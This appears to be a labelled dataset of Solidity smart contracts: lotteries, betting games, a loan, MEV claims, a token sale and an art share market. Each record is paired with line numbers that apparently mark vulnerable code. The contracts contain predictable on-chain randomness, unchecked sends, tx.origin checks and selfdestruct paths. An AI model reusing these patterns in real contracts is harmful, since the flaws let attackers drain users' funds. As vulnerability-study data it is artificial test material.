	function renameArtwork(uint256 artworkId, string newTitle) public onlyDev {
		require(_exists(artworkId));
		Artwork storage artwork = _artworks[artworkId];
		artwork._title = newTitle;
	}
	// This function is only for the website and whether or not
	// it displays a certain artwork, any user may still buy shares
	// for an invisible artwork although it's not really art unless
	// you can view it.
	// This is exclusively reserved for copyright cases should any
	// artworks be flagged as such.
	function toggleArtworkVisibility(uint256 artworkId) public onlyDev {
		require(_exists(artworkId));
		Artwork storage artwork = _artworks[artworkId];
		artwork._visible = !artwork._visible;
	}
	// The two withdrawal functions below are here so that the dev
	// can access the dividends of the contract if it owns any
	// artworks. As all ETH is transferred straight away upon the
	// purchasing of shares, the only ETH left in the contract will
	// be from dividends or the rounding errors (although the error
	// will only be a few wei each transaction) due to the nature
	// of dividing and working with integers.
	function withdrawAmount(uint256 amount, address toAddress) public onlyDev {
		require(amount != 0);
		require(amount <= this.balance);
		toAddress.transfer(amount);
	}
	// Used to empty the contracts balance to an address.
	function withdrawAll(address toAddress) public onlyDev {
		toAddress.transfer(this.balance);
	}
	//////////////////////////////////////////////////////////////////////
	//  Main Artwork Share Purchasing Function
	// This is the main point of interaction in this contract,
	// it will allow a user to purchase shares in an artwork
	// and hence with their investment, they pay dividends to
	// all the current shareholders and then the user themselves
	// will become a shareholder and earn dividends on any future
	// purchases of shares.
	// See the getArtwork() function for more information on pricing
	// and how shares work.
	function purchaseSharesOfArtwork(uint256 artworkId) public payable {
		// This makes sure only people, and not contracts, can buy shares.
		require(msg.sender == tx.origin);
		require(_exists(artworkId));
		Artwork storage artwork = _artworks[artworkId];
		// The artwork owner is not allowed to purchase shares of their
		// own art, instead they will earn dividends automatically.
		require(msg.sender != artwork._owner);
		uint256 totalShares;
		uint256[3] memory prices;
		( , , , prices, totalShares, , ) = getArtwork(artworkId);
		uint256 currentPrice = prices[1];
		// Make sure the buyer sent enough ETH
		require(msg.value >= currentPrice);
		// Send back the excess if there's any.
		uint256 purchaseExcess = msg.value - currentPrice;
		if (purchaseExcess > 0)
			msg.sender.transfer(purchaseExcess);
		// Now pay all the shareholders accordingly.
		// (this will potentially cost a lot of gas)
		for (uint256 i = 0; i < artwork._shareholders.length; i++) {
			address shareholder = artwork._shareholders[i];
			if (shareholder != address(this)) { // transfer ETH if the shareholder isn't this contract
				shareholder.transfer((currentPrice * artwork._shares[shareholder]) / totalShares);
			}
		}
		// Add the buyer to the registry.
		if (!artwork._hasShares[msg.sender]) {
			artwork._hasShares[msg.sender] = true;
			artwork._shareholders.push(msg.sender);
		}
		artwork._purchases++; // track our purchase
		artwork._shares[msg.sender] += artwork._purchases; // add the shares to the sender
		artwork._shares[artwork._owner] = artwork._purchases + 1; // set the owners next shares
		ArtworkSharesPurchased(artworkId, artwork._title, msg.sender, artwork._purchases);
	}
	//////////////////////////////////////////////////////////////////////
	//  Getters
	function _exists(uint256 artworkId) private view returns (bool) {
		return artworkId < _artworks.length;
	}
	function getArtwork(uint256 artworkId) public view returns (string artworkTitle, address ownerAddress, bool isVisible, uint256[3] artworkPrices, uint256 artworkShares, uint256 artworkPurchases, uint256 artworkShareholders) {
		require(_exists(artworkId));
		Artwork memory artwork = _artworks[artworkId];
		// As at each step we are simply increasing the number of shares given by 1, the resulting
		// total from adding up consecutive numbers from 1 is the same as the triangular number
		// series (1 + 2 + 3 + ...). the formula for finding the nth triangular number is as follows;
		// Tn = (n * (n + 1)) / 2
		// For example the 10th triangular number is (10 * 11) / 2 = 55
		// In our case however, the owner of the artwork always inherits the shares being bought
		// before transferring them to the buyer but the owner cannot buy shares of their own artwork.
		// This means that when calculating how many shares, we need to add 1 to the total purchases
		// in order to accommodate for the owner. from here we just need to adjust the triangular
		// number formula slightly to get;
		// Shares After n Purchases = ((n + 1) * (n + 2)) / 2
		// Let's say the art is being purchased for a second time which means the purchaser is
		// buying 3 shares and therefore the owner will get 3 shares worth of dividends from the
		// overall purchase value. As it's the 2nd purchase, there are (3 * 4) / 2 = 6 shares total
		// according to our formula which is as expected.
		uint256 totalShares = ((artwork._purchases + 1) * (artwork._purchases + 2)) / 2;
		// Set up our prices array;
		// 0: base price
		// 1: current price
		// 2: next price
		uint256[3] memory prices;
		prices[0] = artwork._basePrice;
		// The current price is also directly related the total number of shares, it simply treats
		// the total number of shares as a percentage and adds that much on top of the base price.","[45, 81, 84]"
"pragma solidity ^0.4.21;
interface IERC20Token {
    function totalSupply() public constant returns (uint);
    function balanceOf(address tokenlender) public constant returns (uint balance);
    function allowance(address tokenlender, address spender) public constant returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);
    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenlender, address indexed spender, uint tokens);
}
contract LoanRequest_iii {
    address public borrower = msg.sender;
    IERC20Token public token;
    uint256 public collateralAmount;
    uint256 public loanAmount;
    uint256 public payoffAmount;
    uint256 public loanDuration;
    function LoanRequest(
        IERC20Token _token,
        uint256 _collateralAmount,
        uint256 _loanAmount,
        uint256 _payoffAmount,
        uint256 _loanDuration
    )
        public
    {
        token = _token;
        collateralAmount = _collateralAmount;
        loanAmount = _loanAmount;
        payoffAmount = _payoffAmount;
        loanDuration = _loanDuration;
    }
    Loan public loan;
    event LoanRequestAccepted(address loan);
    function lendEther() public payable {
        require(msg.value == loanAmount);
        loan = new Loan(
            msg.sender,
            borrower,
            token,
            collateralAmount,
            payoffAmount,
            loanDuration
        );
        require(token.transferFrom(borrower, loan, collateralAmount));
        borrower.transfer(loanAmount);
        emit LoanRequestAccepted(loan);
    }
}
contract Loan {
    address public lender;
    address public borrower;
    IERC20Token public token;
    uint256 public collateralAmount;
    uint256 public payoffAmount;
    uint256 public dueDate;
    function Loan(
        address _lender,
        address _borrower,
        IERC20Token _token,
        uint256 _collateralAmount,
        uint256 _payoffAmount,
        uint256 loanDuration
    )
        public
    {
        lender = _lender;
        borrower = _borrower;
        token = _token;
        collateralAmount = _collateralAmount;
        payoffAmount = _payoffAmount;
        dueDate = now + loanDuration;
    }
    event LoanPaid();
    function payLoan() public payable {
        require(now <= dueDate);
        require(msg.value == payoffAmount);
        require(token.transfer(borrower, collateralAmount));
        emit LoanPaid();
        selfdestruct(lender);
    }
    function repossess() public {
        require(now > dueDate);
        require(token.transfer(lender, collateralAmount));
        selfdestruct(lender);
    }
}","[76, 77, 81, 83, 86]"
"pragma solidity >=0.7.0 <0.8.0;
// In the first version, claimed block nonce / mixDigest IS NOT VERIFIED
// This contract assumes that mev block template producer completely TRUSTS pool operator that received the signed work order.
// This contract !DOES NOT VERIFY! that block nonce / mixDigest is valid or that it was broadcasted without delay
// In the next version we're planning to introduce trustless approach to verify submited block nonce on-chain(see smartpool) and verify delay in seconds for share submission(using oracles)
contract LogOfClaimedMEVBlocks {
    uint256 internal constant FLAG_BLOCK_NONCE_LIMIT = 0x10000000000000000;
    mapping (address => uint) public timestampOfPossibleExit;
    mapping (address => uint) public depositedEther;
    mapping (address => address) public blockSubmissionsOperator;
    mapping (bytes32 => uint) public claimedBlockNonce;
    mapping (bytes32 => bytes32) public claimedBlockMixDigest;
    event Deposit(address user, uint amount);
    event Withdraw(address user, uint amount);
    event BlockClaimed(bytes32 blockHeader, bytes32 seedHash, bytes32 target, uint blockNumber, uint blockPayment, address miningPoolAddress, address mevProducerAddress, uint blockNonce, bytes32 mixDigest);
    function setBlockClaimsOperator(address newBlockSubmissionsOperator) public {
        assert(msg.data.length == 36);
        blockSubmissionsOperator[msg.sender] = newBlockSubmissionsOperator;
    }
    fallback () payable external {
        this.depositAndLock(msg.value, 24 * 60 * 60);
    }
    function depositAndLock(uint depositAmount, uint depositDuration) payable external {
        require(depositAmount == msg.value);
        // Enforcing min and max lockup durations
        require(depositDuration >= 24 * 60 * 60 && depositDuration < 365 * 24 * 60 * 60);
        timestampOfPossibleExit[msg.sender] = block.timestamp + depositDuration;
        if (msg.value > 0) {
            depositedEther[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }
    function withdrawUpTo(uint etherAmount) external {
        // User previously deposited into contract
        require(depositedEther[msg.sender] > 0);
        // Deposit lockup period is over
        require(block.timestamp > timestampOfPossibleExit[msg.sender]);
        if (depositedEther[msg.sender] < etherAmount)
            etherAmount = depositedEther[msg.sender];
        depositedEther[msg.sender] -= etherAmount;
        msg.sender.transfer(etherAmount);
        emit Withdraw(msg.sender, etherAmount);
    }
    function submitClaim(
        bytes32 blockHeader,
        bytes32 seedHash,
        bytes32 target,
        uint blockNumber,
        uint blockPayment,
        address payable miningPoolAddress,
        address mevProducerAddress,
        uint8 v,
        bytes32 r,
        bytes32 s,
        uint blockNonce,
        bytes32 mixDigest
    ) public {
        require(msg.sender == blockSubmissionsOperator[miningPoolAddress] || msg.sender == miningPoolAddress);
        bytes32 hash = keccak256(abi.encodePacked(blockHeader, seedHash, target, blockNumber, blockPayment, miningPoolAddress));
        if (claimedBlockNonce[hash] == 0 && blockNonce < FLAG_BLOCK_NONCE_LIMIT) {
            if (ecrecover(keccak256(abi.encodePacked(""\x19Ethereum Signed Message:\n32"", hash)),v,r,s) == mevProducerAddress) {
                require(depositedEther[mevProducerAddress] >= blockPayment);
                claimedBlockNonce[hash] = FLAG_BLOCK_NONCE_LIMIT + blockNonce;
                claimedBlockMixDigest[hash] = mixDigest;
                depositedEther[mevProducerAddress] -= blockPayment;
                miningPoolAddress.transfer(blockPayment);
                emit BlockClaimed(blockHeader, seedHash, target, blockNumber, blockPayment, miningPoolAddress, mevProducerAddress, blockNonce, mixDigest);
            }
        }
    }
    function remainingDurationForWorkClaim(
        bytes32 blockHeader,
        bytes32 seedHash,
        bytes32 target,
        uint blockNumber,
        uint blockPayment,
        address miningPoolAddress,
        address mevProducerAddress,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public view returns (uint) {
        bytes32 hash = keccak256(abi.encodePacked(blockHeader, seedHash, target, blockNumber, blockPayment, miningPoolAddress));
        if (claimedBlockNonce[hash] != 0) return 0;
        if (ecrecover(keccak256(abi.encodePacked(""\x19Ethereum Signed Message:\n32"", hash)),v,r,s) != mevProducerAddress) return 0;
        if (depositedEther[mevProducerAddress] < blockPayment) return 0;
        if (block.timestamp >= timestampOfPossibleExit[mevProducerAddress]) return 0;
        return timestampOfPossibleExit[mevProducerAddress] - block.timestamp;
    }
}
contract GasOptimisedPayoutsToMiners {
    function dispersePaymentForShares(uint256[] memory minerPayoutData) external payable {
        for (uint256 i = 0; i < minerPayoutData.length; i++) {
            uint256 singlePayout = minerPayoutData[i];
            payable(singlePayout).transfer(singlePayout / (16 ** 40));
        }
        uint256 balance = address(this).balance;
        if (balance > 0)
            msg.sender.transfer(balance);
    }
}",[95]
"pragma solidity ^0.4.19;
contract Lottery {
    address owner;
    address profit = 0xB7BB510B0746bdeE208dB6fB781bF5Be39d15A15;
    uint public tickets;
    uint public round;
    string public status;
    uint public lastWiningTicketNumber;
    address public lastWinner;
    address ticket1;
    address ticket2;
    address ticket3;
    address ticket4;
    address ticket5;
    uint constant price = 0.01 ether; 
    uint seed;
    bool entry = false;
    function Lottery() public { 
        owner = msg.sender;
        tickets = 5;
        round = 1;
        status = ""Running"";
        entry = false;
        seed = 777;
    }
    function changeStatus(string w) public {
        if (msg.sender == owner) {
            status = w;
        }
        else {
            revert();
        }
    }
    function changeSeed(uint32 n) public {
        if (msg.sender == owner) {
            seed = uint(n);
            seed = uint(block.blockhash(block.number-seed))%2000 + 1; 
        }
        else {
            revert();
        }
    }
    function () public payable { 
        buyTickets();
    }
    function buyTickets() public payable {
        if (entry == true) { 
            revert();
        }
        entry = true;
        if (msg.value != (price)) {
            entry = false;
            if (keccak256(status) == keccak256(""Shutdown"")) { 
                selfdestruct(owner);
            }
            revert(); 
        }
        else {
            if (tickets == 5) {
                tickets -= 1;
                ticket1 = msg.sender;
            }
            else if(tickets == 4) {
                tickets -= 1;
                ticket2 = msg.sender;
                profit.transfer(price * 1/2); 
            }
            else if(tickets == 3) {
                tickets -= 1;
                ticket3 = msg.sender;
            }
            else if(tickets == 2) {
                tickets -= 1;
                ticket4 = msg.sender;
            }
            else if(tickets == 1) {
                ticket5 = msg.sender;
                tickets = 5; 
                round += 1; 
                seed = uint(block.blockhash(block.number-seed))%2000 + 1; 
                uint random_number = uint(block.blockhash(block.number-seed))%5 + 1; 
                lastWiningTicketNumber = random_number; 
                uint pay = (price * 9/2); 
                if (random_number == 1) {
                    ticket1.transfer(pay);
                    lastWinner = ticket1; 
                }
                else if(random_number == 2) {
                    ticket2.transfer(pay);
                    lastWinner = ticket2; 
                }
                else if(random_number == 3) {
                    ticket3.transfer(pay);
                    lastWinner = ticket3; 
                }
                else if(random_number == 4) {
                    ticket4.transfer(pay);
                    lastWinner = ticket4; 
                }
                else if(random_number == 5) {
                    ticket5.transfer(pay);
                    lastWinner = ticket5; 
                }
            }
        }
        entry = false;
    }
}","[37, 46, 53, 54]"
"pragma solidity ^0.4.19;
contract Lottery4 {
    address owner;
    address profit = 0xB7BB510B0746bdeE208dB6fB781bF5Be39d15A15;
    uint public tickets;
    uint public round;
    string public status;
    uint public lastWiningTicketNumber;
    address public lastWinner;
    address ticket1;
    address ticket2;
    address ticket3;
    address ticket4;
    address ticket5;
    uint constant price = 0.05 ether; 
    uint seed;
    bool entry = false;
    function Lottery4() public { 
        owner = msg.sender;
        tickets = 5;
        round = 1;
        status = ""Running"";
        entry = false;
        seed = 777;
    }
    function changeStatus(string w) public {
        if (msg.sender == owner) {
            status = w;
        }
        else {
            revert();
        }
    }
    function changeSeed(uint32 n) public {
        if (msg.sender == owner) {
            seed = uint(n);
            seed = uint(block.blockhash(block.number-seed))%2000 + 1; 
        }
        else {
            revert();
        }
    }
    function () public payable { 
        buyTickets();
    }
    function buyTickets() public payable {
        if (entry == true) { 
            revert();
        }
        entry = true;
        if (msg.value != (price)) {
            entry = false;
            if (keccak256(status) == keccak256(""Shutdown"")) { 
                selfdestruct(owner);
            }
            revert(); 
        }
        else {
            if (tickets == 5) {
                tickets -= 1;
                ticket1 = msg.sender;
            }
            else if(tickets == 4) {
                tickets -= 1;
                ticket2 = msg.sender;
                profit.transfer(price * 1/2); 
            }
            else if(tickets == 3) {
                tickets -= 1;
                ticket3 = msg.sender;
            }
            else if(tickets == 2) {
                tickets -= 1;
                ticket4 = msg.sender;
            }
            else if(tickets == 1) {
                ticket5 = msg.sender;
                tickets = 5; 
                round += 1; 
                seed = uint(block.blockhash(block.number-seed))%2000 + 1; 
                uint random_number = uint(block.blockhash(block.number-seed))%5 + 1; 
                lastWiningTicketNumber = random_number; 
                uint pay = (price * 9/2); 
                if (random_number == 1) {
                    ticket1.transfer(pay);
                    lastWinner = ticket1; 
                }
                else if(random_number == 2) {
                    ticket2.transfer(pay);
                    lastWinner = ticket2; 
                }
                else if(random_number == 3) {
                    ticket3.transfer(pay);
                    lastWinner = ticket3; 
                }
                else if(random_number == 4) {
                    ticket4.transfer(pay);
                    lastWinner = ticket4; 
                }
                else if(random_number == 5) {
                    ticket5.transfer(pay);
                    lastWinner = ticket5; 
                }
            }
        }
        entry = false;
    }
}","[37, 46, 54]"
"/*
BET NUMBER 0 or 1.IF YOU WIN,THIS CONTRACT WILL AUTOMATIC SEND ALL BALANCE TO YOU.IF YOU LOSE,
THIS CONTRACT WILL SEND ALL BALANCE TO OWNER. ENJOY 50%.
*/
pragma solidity ^0.4.19;
contract Lottery50chance
{
  // creates random number between 0 and 1 on contract creation
  uint256 private randomNumber = uint256( keccak256(now) ) % 2;
  uint256 public minBet = 1 ether;
  address owner = msg.sender;
  struct GameHistory 
  {
    address player;
    uint256 number;
  }
  GameHistory[] public log;
  modifier onlyOwner() 
  {
    require(msg.sender == owner);
    _;
  }
  function play(uint256 _number) 
  public 
  payable 
  {
      if(msg.value >= minBet && _number <= 1)
      {
          GameHistory gameHistory;
          gameHistory.player = msg.sender;
          gameHistory.number = _number;
          log.push(gameHistory);
          // if player guesses correctly, transfer contract balance
          // else transfer to owner
          if (_number == randomNumber) 
          {
              selfdestruct(msg.sender);
          }else{
              selfdestruct(owner);
          }
      }
  }
  //if no one play the game.owner withdraw
  function withdraw(uint256 amount) 
  public 
  onlyOwner 
  {
    owner.transfer(amount);
  }
  function() public payable { }
}","[23, 24, 25, 37, 39]"
"pragma solidity ^0.4.19;
contract Lottery7 {
    address owner;
    address profit = 0xB7BB510B0746bdeE208dB6fB781bF5Be39d15A15;
    uint public tickets;
    uint public round;
    string public status;
    uint public lastWiningTicketNumber;
    address public lastWinner;
    address ticket1;
    address ticket2;
    address ticket3;
    address ticket4;
    address ticket5;
    uint constant price = 0.1 ether; 
    uint seed;
    bool entry = false;
    function Lottery7() public { 
        owner = msg.sender;
        tickets = 5;
        round = 1;
        status = ""Running"";
        entry = false;
        seed = 777;
    }
    function changeStatus(string w) public {
        if (msg.sender == owner) {
            status = w;
        }
        else {
            revert();
        }
    }
    function changeSeed(uint32 n) public {
        if (msg.sender == owner) {
            seed = uint(n);
            seed = uint(block.blockhash(block.number-seed))%2000 + 1; 
        }
        else {
            revert();
        }
    }
    function () public payable { 
        buyTickets();
    }
    function buyTickets() public payable {
        if (entry == true) { 
            revert();
        }
        entry = true;
        if (msg.value != (price)) {
            entry = false;
            if (keccak256(status) == keccak256(""Shutdown"")) { 
                selfdestruct(owner);
            }
            revert(); 
        }
        else {
            if (tickets == 5) {
                tickets -= 1;
                ticket1 = msg.sender;
            }
            else if(tickets == 4) {
                tickets -= 1;
                ticket2 = msg.sender;
                profit.transfer(price * 1/2); 
            }
            else if(tickets == 3) {
                tickets -= 1;
                ticket3 = msg.sender;
            }
            else if(tickets == 2) {
                tickets -= 1;
                ticket4 = msg.sender;
            }
            else if(tickets == 1) {
                ticket5 = msg.sender;
                tickets = 5; 
                round += 1; 
                seed = uint(block.blockhash(block.number-seed))%2000 + 1; 
                uint random_number = uint(block.blockhash(block.number-seed))%5 + 1; 
                lastWiningTicketNumber = random_number; 
                uint pay = (price * 9/2); 
                if (random_number == 1) {
                    ticket1.transfer(pay);
                    lastWinner = ticket1; 
                }
                else if(random_number == 2) {
                    ticket2.transfer(pay);
                    lastWinner = ticket2; 
                }
                else if(random_number == 3) {
                    ticket3.transfer(pay);
                    lastWinner = ticket3; 
                }
                else if(random_number == 4) {
                    ticket4.transfer(pay);
                    lastWinner = ticket4; 
                }
                else if(random_number == 5) {
                    ticket5.transfer(pay);
                    lastWinner = ticket5; 
                }
            }
        }
        entry = false;
    }
}","[37, 46, 53, 54]"
"pragma solidity ^0.4.18;
contract Lotto {
  address public owner = msg.sender;
  address[] internal playerPool;
  uint seed = 0;
  uint amount = 0.1 ether;
  // events
  event Payout(address from, address to, uint quantity);
  event BoughtIn(address from);
  event Rejected();
  modifier onlyBy(address _account) {
    require(msg.sender == _account);
    _;
  }
  function changeOwner(address _newOwner) public onlyBy(owner) {
    owner = _newOwner;
  }
/*
The reasoning behind this method to get a random number is, because I'm not
displaying the current number of players, no one should know who the 11th player
will be, and that should be random enough to prevent anyone from cheating the system.
The reward is only 1 ether so it's low enough that miners won't try to influence it
... i hope.
*/
  function random(uint upper) internal returns (uint) {
    seed = uint(keccak256(keccak256(playerPool[playerPool.length -1], seed), now));
    return seed % upper;
  }
  // only accepts a value of 0.01 ether. no extra eth please!! don't be crazy!
  // i'll make contracts for different sized bets eventually.
  function buyIn() payable public returns (uint) {
    if (msg.value * 10 != 0.1 ether) {
      revert();
      Rejected();
    } else {
      playerPool.push(msg.sender);
      BoughtIn(msg.sender);
      if (playerPool.length >= 11) {
        selectWinner();
      }
    }
    return playerPool.length;
  }
  function selectWinner() private {
    address winner = playerPool[random(playerPool.length)];
    winner.transfer(amount);
    playerPool.length = 0;
    owner.transfer(this.balance);
    Payout(this, winner, amount);
  }
/*
If the contract becomes stagnant and new players haven't signed up for awhile,
this function will return the money to all the players. The function is made
payable so I can send some ether with the transaction to pay for gas. this way
I can make sure all players are paid back. 
as a note, 100 finney == 0.1 ether.
*/
  function refund() public onlyBy(owner) payable {
    require(playerPool.length > 0);
    for (uint i = 0; i < playerPool.length; i++) {
      playerPool[i].transfer(100 finney);
    }
      playerPool.length = 0;
  }
/*
Self destruct just in case. Also, will refund all ether to the players before it
explodes into beautiful digital star dust.
*/
  function close() public onlyBy(owner) {
    refund();
    selfdestruct(owner);
  }
// fallback function acts the same as buyIn(), omitting the return of course.
  function () public payable {
    require(msg.value * 10 == 0.1 ether);
    playerPool.push(msg.sender);
    BoughtIn(msg.sender);
    if (playerPool.length >= 11) {
      selectWinner();
    }
  }
}",[61]
"  /**
   * @dev Function to stop the contribution
   */
  function stop() public onlyOwner  {
    endTime = now ;
  }
  /**
   * @dev Function for withdrawing eth by the owner
   */
  function ownerWithdrawal(uint256 amt) public onlyOwner  {
    // Limit owner from withdrawing not more than 70%
    require((amt.add(ownerWithdrawn)) <= (weiRaised.div(100)).mul(70));
    if (owner.send(amt)) {
        ownerWithdrawn=ownerWithdrawn.add(amt);
        FundTransfer(owner, amt);
    }
  }
  /**
   * @dev Function for approving contributors after KYC
   */
  function KYCApprove(address[] contributorsList) public onlyOwner  {
    for (uint256 i = 0; i < contributorsList.length; i++) {
        address addr=contributorsList[i];
        //set KYC Status
        KYCDone[addr]=true;
        KYCApproved(addr);
        token.release(addr);
    }
  }
  /**
   * @dev Function for withdrawing won amount by the winners
   */
  function winnerWithdrawal() public {
    require(now >= endTime);
    //check whether winner
    require(amountWon[msg.sender] > 0);
    //check whether winner done KYC
    require(KYCDone[msg.sender]);
    //check whether winner already withdrawn the won amount
    require(!claimed[msg.sender]);
    if (msg.sender.send(amountWon[msg.sender])) {
        claimed[msg.sender]=true;
        FundTransfer(msg.sender,amountWon[msg.sender] );
    }
  }
  // @return Current token balance of this contract
  function tokensAvailable()public view returns (uint256) {
    return token.balanceOf(this);
  }
  // @return List of top winners
  function showTopWinners() public view returns (address[]) {
    require(now >= endTime);
        return (topWinners);
  }
  // @return List of random winners
  function showRandomWinners() public view returns (address[]) {
    require(now >= endTime);
        return (randomWinners);
  }
  /**
   * @dev Function to destroy contract
   */
  function destroy() public onlyOwner {
    require(now >= endTime);
    uint256 balance= this.balance;
    owner.transfer(balance);
    FundTransfer(owner, balance);
    uint256 balanceToken = tokensAvailable();
    token.transfer(owner, balanceToken);
    selfdestruct(owner);
  }
}",[64]
"        }
    }
    function setReward(uint256 C2C, uint256 E2C, uint256 C2E, uint256 E2E) public onlyOwner {
        sC2C.reward = C2C;
        sE2C.reward = E2C;
        sC2E.reward = C2E;
        sE2E.reward = E2E;
    }
    function enableGame(bool C2C, bool E2C, bool C2E, bool E2E) public onlyOwner {
        sC2C.bEnabled = C2C;
        sE2C.bEnabled = E2C;
        sC2E.bEnabled = C2E;
        sE2E.bEnabled = E2E;
    }
    function setGameFee(uint256 C2C, uint256 E2C, uint256 C2E, uint256 E2E) public onlyOwner {
        sC2C.houseEdge = C2C;
        sE2C.houseEdge = E2C;
        sC2E.houseEdge = C2E;
        sE2E.houseEdge = E2E;
    }
    function setGameMaxBet(uint256 C2C, uint256 E2C, uint256 C2E, uint256 E2E) public onlyOwner {
        sC2C.maxBet = C2C;
        sE2C.maxBet = E2C;
        sC2E.maxBet = C2E;
        sE2E.maxBet = E2E;
    }
    function setGameMinBet(uint256 C2C, uint256 E2C, uint256 C2E, uint256 E2E) public onlyOwner {
        sC2C.minBet = C2C;
        sE2C.minBet = E2C;
        sC2E.minBet = C2E;
        sE2E.minBet = E2E;
    }
    function setToken(address _token) public onlyOwner {
        token = IERC20(_token);
    }
    function setChip(address _chip) public onlyOwner {
        chip = StandardTokenERC20Custom(_chip);
    }
    function setManager(address _manager) public onlyOwner {
        manager = _manager;
    }
    function setProperties(string _salt, uint _E2C_Ratio) public onlyOwner {
        require(_E2C_Ratio > 0);
        salt = uint(keccak256(_salt));
        E2C_Ratio = _E2C_Ratio;
    }
    function() public { //fallback
        revert();
    }
    function swapC2T(address _from, uint256 _value) payable public {
        require(chip.transferFrom(_from, manager, _value));
        require(token.transferFrom(manager, _from, _value));
        emit Swapped(""TOKA"", _value);
    }
    function swapT2C(address _from, uint256 _value) payable public {
        require(token.transferFrom(_from, manager, _value));
        require(chip.transferFrom(manager, _from, _value));
        emit Swapped(""CHIP"", _value);
    }
    function playC2C(address _from, uint256 _value) payable public {
        require(sC2C.bEnabled);
        require(_value >= sC2C.minBet && _value <= sC2C.maxBet);
        require(chip.transferFrom(_from, manager, _value));
        uint256 amountWon = _value * (50 + uint256(keccak256(block.timestamp, block.difficulty, salt++)) % 100 - sC2C.houseEdge) / 100;
        require(chip.transferFrom(manager, _from, amountWon + _value * sC2C.reward)); // reward. but set to be zero.
        // ranking
        for(uint i=0;i<5;i++) {
            if(sC2C.ranking.amount[i] < amountWon) {
                for(uint j=4;j>i;j--) {
                    sC2C.ranking.amount[j] = sC2C.ranking.amount[j-1];
                    sC2C.ranking.date[j] = sC2C.ranking.date[j-1];
                    sC2C.ranking.account[j] = sC2C.ranking.account[j-1];
                }
                sC2C.ranking.amount[i] = amountWon;
                sC2C.ranking.date[i] = now;
                sC2C.ranking.account[i] = _from;
                break;
            }
        }
        // latest
        for(i=4;i>0;i--) {
            sC2C.latest.amount[i] = sC2C.latest.amount[i-1];
            sC2C.latest.date[i] = sC2C.latest.date[i-1];
            sC2C.latest.account[i] = sC2C.latest.account[i-1];
        }
        sC2C.latest.amount[0] = amountWon;
        sC2C.latest.date[0] = now;
        sC2C.latest.account[0] = _from;
        emit Won(amountWon > _value, ""CHIP"", amountWon);//, sC2C.ranking, sC2C.latest);
    }
    function playC2E(address _from, uint256 _value) payable public {
        require(sC2E.bEnabled);
        require(_value >= sC2E.minBet && _value <= sC2E.maxBet);
        require(chip.transferFrom(_from, manager, _value));
        uint256 amountWon = _value * (50 + uint256(keccak256(block.timestamp, block.difficulty, salt++)) % 100 - sC2E.houseEdge) / 100 / E2C_Ratio;
        require(_from.send(amountWon));
        // ranking
        for(uint i=0;i<5;i++) {
            if(sC2E.ranking.amount[i] < amountWon) {
                for(uint j=4;j>i;j--) {
                    sC2E.ranking.amount[j] = sC2E.ranking.amount[j-1];
                    sC2E.ranking.date[j] = sC2E.ranking.date[j-1];
                    sC2E.ranking.account[j] = sC2E.ranking.account[j-1];
                }
                sC2E.ranking.amount[i] = amountWon;
                sC2E.ranking.date[i] = now;
                sC2E.ranking.account[i] = _from;
                break;
            }
        }
        // latest
        for(i=4;i>0;i--) {
            sC2E.latest.amount[i] = sC2E.latest.amount[i-1];
            sC2E.latest.date[i] = sC2E.latest.date[i-1];
            sC2E.latest.account[i] = sC2E.latest.account[i-1];
        }
        sC2E.latest.amount[0] = amountWon;
        sC2E.latest.date[0] = now;
        sC2E.latest.account[0] = _from;
        emit Won(amountWon > (_value / E2C_Ratio), ""ETH"", amountWon);//, sC2E.ranking, sC2E.latest);
    }
    function playE2E() payable public {
        require(sE2E.bEnabled);
        require(msg.value >= sE2E.minBet && msg.value <= sE2E.maxBet);
        uint amountWon = msg.value * (50 + uint(keccak256(block.timestamp, block.difficulty, salt++)) % 100 - sE2E.houseEdge) / 100;
        require(msg.sender.send(amountWon));
        require(chip.transferFrom(manager, msg.sender, msg.value * sE2E.reward)); // reward!!
        // ranking",[64]
"pragma solidity ^0.4.18;
/**
* Send 0.0001 to guess a random number from 1-10. Winner gets 90% of the pot.
* 10% goes to the house. Note: house is supplying the initial pot so cry me a 
* river.
*/
contract LuckyNumber {
    address owner;
    uint winningNumber = uint(keccak256(now, owner)) % 10;
    function LuckyNumber() public { // The constructor. 
        owner = msg.sender;
    }
    //Used for the owner to add money to the pot. 
    function addBalance() public payable {
    }
    //fallback function, returns accidental payments to sender
    function() public payable {
       msg.sender.transfer(msg.value); 
    }
    //explicit getter for ""owner""
    function getOwner() view public returns (address)  {
        return owner;
    }
    //explicit getter for ""balance""
    function getBalance() view public returns (uint) {
        return this.balance;
    }
    //allows the owner to abort the contract and retrieve all funds
    function kill() public { 
        if (msg.sender == owner)  // only allow this action if the account sending the signal is the creator
            selfdestruct(owner);       // kills this contract and sends remaining funds back to creator
    }
    /**
     *Take a guess. Transfer 0.00001 ETH to take a guess. 1/10 chance you are 
     * correct. If you win, the function will transfer you 90% of the balance. 
     * It will then kill the contract and return the remainder to the owner.
     */
    function takeAGuess(uint _myGuess) public payable {
        require(msg.value == 0.0001 ether);
        if (_myGuess == winningNumber) {
            msg.sender.transfer((this.balance*9)/10);
            selfdestruct(owner);
        }
    }
}//end of contract","[38, 42]"
"        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address newOwner) public onlyOwner
    {
        require(newOwner != address(0));
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}
contract LynchpinPrivateICO is Ownable(0x1788A2Fe89a3Bfa58DB57aabbf1Ffa08ADED6cba)
{
    using SafeMath for uint256;
    LynchpinToken public lynT = LynchpinToken(0xB0B1685f55843D03739c7D9b0A230F1B7DcF03D5);
    address public beneficiary = 0x1788A2Fe89a3Bfa58DB57aabbf1Ffa08ADED6cba;
    uint256 public tokeninOneEther;
    uint256 public maxTokensToSell = 2000000 * 10**18;
    uint256 public tokenSold;
    bool crowdsaleClosed = false;
    uint256 LOCK_PERIOD_START    = 1556668800;    // Wednesday, May 1, 2019 12:00:00 AM         start time
    uint256 LOCK_PERIOD_9_MONTH  = 1580515200;    // Saturday, February 1, 2020 12:00:00 AM     9th month done
    uint256 LOCK_PERIOD_10_MONTH = 1583020800;    // Sunday, March 1, 2020 12:00:00 AM          10th  month done
    uint256 LOCK_PERIOD_11_MONTH = 1585699200;    // Wednesday, April 1, 2020 12:00:00 AM       11th month done
